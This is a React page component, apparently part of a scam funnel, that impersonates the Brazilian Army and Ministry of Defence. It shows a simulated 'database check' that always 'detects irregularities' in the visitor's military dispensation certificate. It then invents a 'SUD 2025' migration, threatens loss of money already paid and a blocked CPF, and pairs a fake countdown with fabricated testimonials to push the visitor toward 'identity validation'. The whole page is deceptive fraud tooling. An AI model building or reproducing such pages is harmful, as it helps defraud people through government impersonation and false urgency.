import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { AlertTriangle, Shield, CheckCircle, Clock, X, FileX, Database, ArrowRight } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

export default function RegularizacaoMigracaoPage() {
  const [, setLocation] = useLocation();
  const [candidateFirstName, setCandidateFirstName] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [timeLeft, setTimeLeft] = useState(900); // 15 minutes
  const [currentStep, setCurrentStep] = useState(0);
  const [isAnalyzing, setIsAnalyzing] = useState(true);
  const { trackEvent } = useClarityEvents();

  // Gender helper functions
  const isFemale = candidateGender === 'f' || candidateGender === 'F' || candidateGender === 'feminino' || candidateGender === 'female';
  
  const getGenderedText = (masculine: string, feminine: string) => {
    return isFemale ? feminine : masculine;
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Load user data
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        const fullName = parsedData.name || parsedData.nomeCompleto || '';
        const gender = parsedData.gender ||  parsedData.genero || parsedData.sexo || '';
        
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateFirstName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
        
        setCandidateGender(gender.toLowerCase());
      } catch (error) {
        console.error('Error loading user data:', error);
      }
    }

    // Simulate system analysis
    const analysisSteps = [
      "Processando pagamento anterior...",
      "Validando dados no sistema militar...",
      "Verificando Certificado de Dispensa...",
      "Consultando banco de dados do Ministério da Defesa...",
      "Detectando irregularidades..."
    ];

    let stepIndex = 0;
    const analysisInterval = setInterval(() => {
      if (stepIndex < analysisSteps.length - 1) {
        stepIndex++;
        setCurrentStep(stepIndex);
      } else {
        clearInterval(analysisInterval);
        setTimeout(() => {
          setIsAnalyzing(false);
        }, 2000);
      }
    }, 1500);

    // Track page entry
    trackEvent('regularization_page_entered', {
      page: 'regularizacao_migracao',
      candidate_name: candidateFirstName,
      timestamp: new Date().toISOString()
    });

    return () => clearInterval(analysisInterval);
  }, []);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const handleProceedToSolution = () => {
    trackEvent('regularization_problem_acknowledged', {
      page: 'regularizacao_migracao',
      candidate_name: candidateFirstName,
      time_remaining: timeLeft,
      timestamp: new Date().toISOString()
    });
    
    setLocation('/validacao-identidade');
  };

  const analysisSteps = [
    "Processando pagamento anterior...",
    "Validando dados no sistema militar...",
    "Verificando Certificado de Dispensa...",
    "Consultando banco de dados do Ministério da Defesa...",
    "Detectando irregularidades..."
  ];

  if (isAnalyzing) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ 
        fontFamily: 'Rawline, Arial, sans-serif',
        backgroundColor: '#FFFFFF'
      }}>
        <div className="text-center max-w-md mx-auto px-6">
          <div className="w-16 h-16 mx-auto mb-8 border-4 border-gray-200 rounded-full animate-spin" style={{
            borderTopColor: '#6A7D00'
          }}></div>
          
          <h2 className="text-2xl font-semibold text-gray-900 mb-4">
            Validando Dados no Sistema
          </h2>
          
          <div className="space-y-3 mb-6">
            {analysisSteps.map((step, index) => (
              <div key={index} className={`flex items-center text-sm ${
                index <= currentStep ? 'text-green-600' : 'text-gray-400'
              }`}>
                {index <= currentStep ? (
                  <CheckCircle className="w-4 h-4 mr-3" />
                ) : (
                  <div className="w-4 h-4 mr-3 border-2 border-gray-300 rounded-full"></div>
                )}
                <span>{step}</span>
              </div>
            ))}
          </div>
          
          <p className="text-gray-600 text-sm">
            Aguarde enquanto verificamos sua situação no sistema integrado...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
        {/* Breadcrumb */}
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <span className="hover:text-gray-700 cursor-pointer">Home</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="hover:text-gray-700 cursor-pointer">Pagamento</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Regularização Cadastral</span>
        </nav>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
            Irregularidade Detectada: Atualização Cadastral Necessária
          </h1>
          
          <div className="flex items-center text-xs text-gray-600 mb-6 pb-4 border-b border-gray-200">
            <time dateTime="2025-06-14">
              <span className="font-medium">Detectado em:</span> 14/06/2025 às 23:33
            </time>
            <span className="mx-2 text-gray-400">|</span>
            <span className="font-medium">Sistema:</span> Ministério da Defesa - SUD 2025
          </div>

          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#dc2626', backgroundColor: '#fef2f2' }}>
            <p className="text-sm font-medium text-red-800">
              ⚠️ Situação crítica detectada no seu cadastro militar
            </p>
          </div>

          <p className="text-lg text-gray-700 leading-relaxed mb-6">
            <strong>{candidateFirstName}</strong>, durante o processamento do seu agendamento médico, nosso sistema integrado 
            identificou irregularidades que impedem o prosseguimento do seu alistamento no programa emergencial.
          </p>
        </header>

        <article>
          <p className="text-lg text-gray-700 leading-relaxed mb-8">
            Esta situação ocorre quando há incompatibilidades entre o sistema antigo do Exército e o novo 
            Sistema Unificado de Defesa (SUD 2025), que está sendo implementado nacionalmente.
          </p>

          <div className="border-l-4 p-6 mb-8" style={{ borderLeftColor: '#6A7D00', backgroundColor: '#f8f9f0' }}>
            <h2 className="text-xl font-bold mb-4" style={{ color: '#6a7d00' }}>Por que isso acontece?</h2>
            <div className="space-y-4 text-gray-700">
              <p className="leading-relaxed">
                <strong>1. Migração Nacional para SUD 2025:</strong> O Ministério da Defesa está transferindo todos os 
                dados militares para um sistema mais moderno e seguro. Este processo nacional afeta milhões de brasileiros.
              </p>
              <p className="leading-relaxed">
                <strong>2. Certificado de Dispensa Desatualizado:</strong> Seu certificado foi emitido no sistema antigo 
                e precisa ser regularizado para ser compatível com o protocolo 2025.
              </p>
              <p className="leading-relaxed">
                <strong>3. Prazo Limitado:</strong> O sistema antigo será desativado em 30 dias. Após essa data, 
                será impossível fazer a migração digitalmente.
              </p>
            </div>
          </div>

          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#6A7D00', backgroundColor: '#6A7D0021' }}>
            <p className="text-sm font-medium text-black">
              <strong>92% dos brasileiros já migraram seus dados</strong> para o novo sistema
            </p>
          </div>

          <h2 className="text-xl font-bold text-gray-900 mt-8 mb-4">O que está acontecendo no seu caso</h2>
          
          <p className="text-lg text-gray-700 leading-relaxed mb-6">
            Durante a validação automática, identificamos que {getGenderedText('seu', 'sua')} Certificado de Dispensa do Serviço Militar 
            possui inconsistências com o protocolo 2025 e {getGenderedText('seus dados pessoais não foram migrados', 'suas informações pessoais não foram migradas')} para o 
            Sistema Unificado de Defesa.
          </p>

          <div className="mb-8">
            <h3 className="text-lg font-semibold text-gray-900 mb-4" style={{ color: '#6a7d00' }}>
              Problemas Identificados
            </h3>
            
            <div className="space-y-2 mb-8">
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#dc2626' }}></div>
                <span className="text-gray-700">Certificado de Dispensa com status irregular no sistema</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#dc2626' }}></div>
                <span className="text-gray-700">Dados não migrados para o SUD 2025</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#dc2626' }}></div>
                <span className="text-gray-700">Incompatibilidade com protocolo de segurança atual</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#dc2626' }}></div>
                <span className="text-gray-700">Risco de bloqueio no CPF por irregularidade militar</span>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h3 className="text-lg font-semibold text-gray-900 mb-4" style={{ color: '#6a7d00' }}>
              Consequências se não regularizar
            </h3>
            <div className="space-y-3 text-gray-700">
              <p>
                Sem a regularização imediata, você perderá os R$ 225,09 já {getGenderedText('investidos', 'investidas')} no processo e 
                ficará {getGenderedText('impedido', 'impedida')} de participar de qualquer concurso público por 12 meses.
              </p>
              <p>
                Além disso, a irregularidade no certificado militar pode gerar problemas com a Receita Federal, 
                impedindo a obtenção de CPF regular e causando complicações em serviços governamentais.
              </p>
            </div>
          </div>
        </article>

        {/* Countdown Timer */}
        <Card className="mb-8 border-red-200">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <Clock className="w-6 h-6 text-red-600 mr-3" />
                <div>
                  <p className="text-lg font-semibold text-gray-900">Tempo para Regularização</p>
                  <p className="text-sm text-gray-600">Se não resolvido, o processo será cancelado</p>
                </div>
              </div>
              <div className="text-right">
                <div className="text-3xl font-bold text-red-600">
                  {formatTime(timeLeft)}
                </div>
                <p className="text-sm text-red-500 font-medium">URGENTE</p>
              </div>
            </div>
          </CardContent>
        </Card>

        <div className="mb-8">
          <h3 className="text-lg font-semibold text-gray-900 mb-4" style={{ color: '#6a7d00' }}>
            Situação Crítica Detectada
          </h3>
          <div className="space-y-3 text-gray-700">
            <p>
              <strong>Problema 1:</strong> Seu Certificado de Dispensa do Serviço Militar está com status irregular 
              no sistema, incompatível com o novo protocolo 2025, gerando risco de bloqueio no CPF.
            </p>
            <p>
              <strong>Problema 2:</strong> Seus dados pessoais não foram migrados para o Sistema Unificado de Defesa (SUD 2025). 
              O sistema antigo será desativado em 30 dias, tornando a migração impossível após esse prazo.
            </p>
          </div>
        </div>

        <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#d97706', backgroundColor: '#fef3c7' }}>
          <p className="text-sm font-medium text-orange-800">
            ⏳ Prazo crítico: Sistema será desativado em 30 dias
          </p>
        </div>

        {/* Solution Section */}
        <div className="border-l-4 p-6 my-8" style={{ borderLeftColor: '#6a7d00', backgroundColor: '#f8f9f0' }}>
          <h3 className="text-xl font-bold mb-4" style={{ color: '#6a7d00' }}>Solução Digital Disponível</h3>
          <p className="mb-6 leading-relaxed text-lg" style={{ color: '#5a6900' }}>
            {candidateFirstName}, podemos resolver ambos os problemas em 5 minutos através do nosso 
            sistema de regularização digital, evitando que você perca tudo que já investiu.
          </p>
          
          <div className="grid md:grid-cols-2 gap-4 mb-6">
            <div className="space-y-2">
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#6a7d00' }}></div>
                <span className="text-gray-700">Regularização imediata do certificado de dispensa</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#6a7d00' }}></div>
                <span className="text-gray-700">Migração completa para SUD 2025</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#6a7d00' }}></div>
                <span className="text-gray-700">Processamento em 5 minutos</span>
              </div>
            </div>
            
            <div className="space-y-2">
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#6a7d00' }}></div>
                <span className="text-gray-700">Evita perda dos R$ 225,09 já pagos</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#6a7d00' }}></div>
                <span className="text-gray-700">Previne problemas com Receita Federal</span>
              </div>
              <div className="flex items-center">
                <div className="w-2 h-2 rounded-full mr-3" style={{ backgroundColor: '#6a7d00' }}></div>
                <span className="text-gray-700">Libera automaticamente o processo</span>
              </div>
            </div>
          </div>
          
          <button 
            onClick={handleProceedToSolution}
            className="text-white px-8 py-3 text-lg font-semibold transition-colors duration-200 hover:opacity-90"
            style={{ backgroundColor: '#6a7d00' }}
          >
            Resolver irregularidades agora
          </button>
        </div>

        {/* Social Proof */}
        <Card className="mb-8">
          <CardContent className="p-6">
            <h3 className="text-lg font-semibold text-gray-900 mb-4 text-center">
              Outros candidatos resolveram o mesmo problema:
            </h3>
            
            <div className="grid md:grid-cols-3 gap-4">
              <div className="text-center">
                <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                  <CheckCircle className="w-6 h-6 text-green-600" />
                </div>
                <p className="text-sm font-medium text-gray-900">Carlos Silva</p>
                <p className="text-xs text-gray-600">Resolvido em 3 min</p>
              </div>
              <div className="text-center">
                <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                  <CheckCircle className="w-6 h-6 text-green-600" />
                </div>
                <p className="text-sm font-medium text-gray-900">Ana Santos</p>
                <p className="text-xs text-gray-600">Resolvido em 2 min</p>
              </div>
              <div className="text-center">
                <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
                  <CheckCircle className="w-6 h-6 text-green-600" />
                </div>
                <p className="text-sm font-medium text-gray-900">Pedro Costa</p>
                <p className="text-xs text-gray-600">Resolvido em 4 min</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>
      
      <ExercitoFooter />
    </div>
  );
}